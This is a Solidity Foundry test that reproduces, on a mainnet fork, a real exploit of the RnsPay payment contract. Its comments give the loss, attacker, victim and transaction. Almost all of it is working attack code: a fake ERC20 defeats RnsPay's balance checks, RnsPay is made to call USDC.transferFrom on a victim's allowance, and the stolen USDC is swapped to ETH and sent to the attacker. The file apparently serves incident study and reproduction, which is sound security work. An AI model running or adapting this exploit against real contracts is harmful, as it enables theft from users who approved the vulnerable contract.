// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1,050 USDC
// Attacker : 0x806d9d1f1b80107a294393c76258b69b441565f0
// Attack Contract : 0x5198bc63edf0f9d9926c4cd4db4ef18032ac4767
// Vulnerable Contract : 0x4c7f92d77b331ea74092e2e347c9fd026faa1c3f
// Attack Tx : https://etherscan.io/tx/0x69a825ffedeb4461afc95e21475c011b1675a95d318bb1dd63b13307dfe3b9ed
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x4c7f92d77b331ea74092e2e347c9fd026faa1c3f#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/562
//
// RnsPay lets the caller provide an arbitrary exchange target and calldata.
// The attacker used a fake ERC20 as both pay and receipt token so RnsPay's
// token balance checks passed, then made RnsPay call USDC.transferFrom with a
// victim that had approved RnsPay.

address constant ATTACKER = 0x806D9D1F1B80107A294393c76258b69b441565f0;
address constant RNS_PAY = 0x4c7f92d77b331EA74092e2E347c9FD026FAA1c3f;
address constant USDC_TOKEN = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant USDC_ALLOWANCE_VICTIM = 0x6D191737f9653A66D0e8236fFF6E8EA543C05bC0;

uint256 constant STOLEN_USDC_AMOUNT = 1_050_000_000;

interface IRnsPay {
    struct Payment {
        string orderId;
        uint256 payTokenAmountIn;
        uint256 receiptTokenAmountOut;
        uint256 feeAmount;
        address payTokenContractAddress;
        address dexRouterContractAddress;
        address receiptTokenContractAddress;
        address receiverWalletAddress;
        address feeReceiverAddress;
        uint8 exchangeType;
        bytes dexRouterFeedData;
        uint256 orderInvalidatedMoment;
    }

    function pay(
        Payment calldata payment
    ) external payable returns (bool);
}

contract ContractTest is BaseTestWithBalanceLog {
    IERC20 private constant usdc = IERC20(USDC_TOKEN);

    function setUp() public {
        uint256 forkBlock = 21_988_705;
        vm.createSelectFork("mainnet", forkBlock);

        attacker = ATTACKER;
        vm.label(ATTACKER, "Attacker");
        vm.label(RNS_PAY, "RnsPay");
        vm.label(USDC_ALLOWANCE_VICTIM, "USDC allowance victim");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 Router");
    }

    function testExploit() public balanceLog {
        // step 1: prove the vulnerable allowance and victim balance are live at the fork.
        uint256 attackerEthBefore = ATTACKER.balance;
        uint256 victimUsdcBefore = usdc.balanceOf(USDC_ALLOWANCE_VICTIM);

        // step 2: use fake token accounting to make RnsPay execute arbitrary USDC calldata.
        RnsPayExploit exploit = new RnsPayExploit();
        exploit.attack();

        // step 3: assert the USDC drain and final ETH profit forwarding.
        assertEq(victimUsdcBefore - usdc.balanceOf(USDC_ALLOWANCE_VICTIM), STOLEN_USDC_AMOUNT);
        assertGt(ATTACKER.balance - attackerEthBefore, 0.46 ether);
    }
}

contract RnsPayExploit {
    receive() external payable {}

    function attack() external {
        FakeToken fakeToken = new FakeToken();

        // step 1: RnsPay will call this as USDC.transferFrom with RnsPay as msg.sender.
        bytes memory drainCall = abi.encodeWithSelector(
            IERC20.transferFrom.selector,
            USDC_ALLOWANCE_VICTIM,
            address(this),
            STOLEN_USDC_AMOUNT
        );

        IRnsPay.Payment memory payment = IRnsPay.Payment({
            orderId: "KISS KISS BANG BANG",
            payTokenAmountIn: 1,
            receiptTokenAmountOut: 1,
            feeAmount: 0,
            payTokenContractAddress: address(fakeToken),
            dexRouterContractAddress: USDC_TOKEN,
            receiptTokenContractAddress: address(fakeToken),
            receiverWalletAddress: address(this),
            feeReceiverAddress: address(0),
            exchangeType: 1,
            dexRouterFeedData: drainCall,
            orderInvalidatedMoment: block.timestamp
        });

        IRnsPay(RNS_PAY).pay(payment);

        // step 2: swap the stolen USDC through the same Uniswap V2 route and forward ETH.
        IERC20(USDC_TOKEN).approve(UNISWAP_V2_ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = USDC_TOKEN;
        path[1] = WETH_TOKEN;

        IUniswapV2Router(payable(UNISWAP_V2_ROUTER)).swapExactTokensForETH(
            STOLEN_USDC_AMOUNT,
            0,
            path,
            address(this),
            block.timestamp
        );

        payable(ATTACKER).transfer(address(this).balance);
    }
}

contract FakeToken {
    function balanceOf(
        address
    ) external pure returns (uint256) {
        return 1;
    }

    function allowance(address, address) external pure returns (uint256) {
        return 0;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }
}
